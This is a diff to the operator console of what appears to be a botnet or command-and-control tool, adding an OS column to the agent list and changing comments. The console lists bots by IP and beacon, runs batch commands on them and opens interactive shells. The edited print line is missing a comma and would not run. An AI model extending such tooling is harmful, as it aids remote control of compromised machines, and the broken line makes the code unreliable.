@@ -93,10 +93,12 @@ class Interpreter(threading.Thread):
         print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
         print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")
 
+
+
         bm_success = False
         bm_entry = ''
 
-        # This loop is super shitty, fix it 
+        # This loop is super shitty, fix it << but it works
         while ('quit'.casefold().strip(" ") not in bm_entry):
             if(bm_success):
                 break
@@ -167,15 +169,15 @@ class Interpreter(threading.Thread):
         os._exit(0)
 #------------------------------------------------------------------------------------------------------------------------------
     def listAgents(self): # Change to listAlive(self)
-        print("       .------------------.                         ")
-        print("       |  LIST OF AGENTS  |                         ")
-        print(".------:------------------:--------.------.--------.")
-        print("|  ID  |  IP ADDRESS (v4) |  PORT  | PING | BEACON |")
-        print(":------:------------------:--------:------:--------:")
+        print("       .------------------.                               ")
+        print("       |  LIST OF AGENTS  |                               ")
+        print(".------:------------------:--------.--------.------.--------.")
+        print("|  ID  |  IP ADDRESS (v4) |  PORT  |   OS   | PING | BEACON |")
+        print(":------:------------------:--------:--------:------:--------:")
 
         for agent in self.agentList:
-            print("| %4d | %16s | %6d | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.status[0], agent.status[1]))
-            print(":------:------------------:--------:------:--------:")
+            print("| %4d | %16s | %6d | %4s | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(),agent.getOS() agent.status[0], agent.status[1]))
+            print(":------:------------------:--------:--------:------:--------:")
 #------------------------------------------------------------------------------------------------------------------------------
     def interact(self, id):
         # print("Shell function entry point")
@@ -192,7 +194,7 @@ class Interpreter(threading.Thread):
             print("[* Interpreter-Msg] Shell exited gracefully...\n")
         else:
             print("[* Interpreter-Msg] Shell exited with errors...\n")
-
+#------------------------------------------------------------------------------------------------------------------------------
     def kill(self, id):
         print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")
 
